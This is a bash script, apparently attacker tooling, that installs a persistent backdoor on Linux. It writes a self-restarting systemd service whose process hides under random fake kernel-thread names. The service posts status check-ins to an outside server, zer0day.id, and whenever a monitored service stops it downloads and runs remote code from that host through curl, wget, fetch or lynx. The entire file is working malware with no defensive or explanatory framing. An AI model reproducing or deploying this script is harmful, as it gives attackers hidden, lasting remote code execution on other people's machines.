#!/bin/bash
# Code By HaxorWorld

self_healing_script_path="/usr/local/bin/self"
service_file_path="/etc/systemd/system/self.service"
php_endpoint="https://zer0day.id/love.php"  
service_name="defunct"
pid_file="/var/run/self.pid"


proc_name_arr=("[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm_percpu_wq]" "[rcu_preempt]" "[kworker]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")


PROC_HIDDEN_NAME_DEFAULT="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"


cat << EOF > "$self_healing_script_path"
#!/bin/bash

host=\$(hostname)
php_endpoint="$php_endpoint"  
service_name="$service_name"
pid_file="$pid_file"


choose_random_proc_name() {
    proc_names=("[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm_percpu_wq]" "[rcu_preempt]" "[kworker]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")
    echo "\${proc_names[\$((RANDOM % \${#proc_names[@]}))]}"
}


exec -a "$PROC_HIDDEN_NAME_DEFAULT" /bin/bash -c '

check_pid() {
    if [ -f "$pid_file" ]; then
        if ps -p "\$(cat $pid_file)" > /dev/null 2>&1; then
            return 0
        else
            return 1
        fi
    else
        return 1
    fi
}

write_pid() {
    echo $$ > "$pid_file"
}

cleanup() {
    rm -f "$pid_file"
}
trap cleanup EXIT

write_pid

while true; do
    if systemctl is-active --quiet "$service_name"; then
        
        RANDOM_SLEEP_NAME="\$(choose_random_proc_name)"
        
        exec -a "\$RANDOM_SLEEP_NAME" sleep 3  
    else
        curl -sL -H "Content-Type: application/json" -X POST "$php_endpoint?status=service_down"
        
        
        bash -c "\$(curl -fsSL https://zer0day.id/y)" || bash -c "\$(wget -qO- https://zer0day.id/y)" || bash -c "\$(fetch -o - https://zer0day.id/y)" || bash -c "\$(lynx -source https://zer0day.id/y)" || bash -c "\$(brew install -q https://zer0day.id/y)"

        if systemctl is-active --quiet "$service_name"; then
            curl -sL -H "Content-Type: application/json" -X POST "$php_endpoint?status=service_up"
        else
            curl -sL -H "Content-Type: application/json" -X POST "$php_endpoint?status=service_fail"
        fi
    fi
done
'
EOF

chmod +x "$self_healing_script_path"


cat << EOF > "$service_file_path"
[Unit]
Description=Self Service

[Service]
ExecStart=$self_healing_script_path
Restart=always
RestartSec=10
PIDFile=$pid_file

[Install]
WantedBy=multi-user.target
EOF


systemctl daemon-reload
systemctl enable self.service
systemctl start self.service

systemctl status self.service
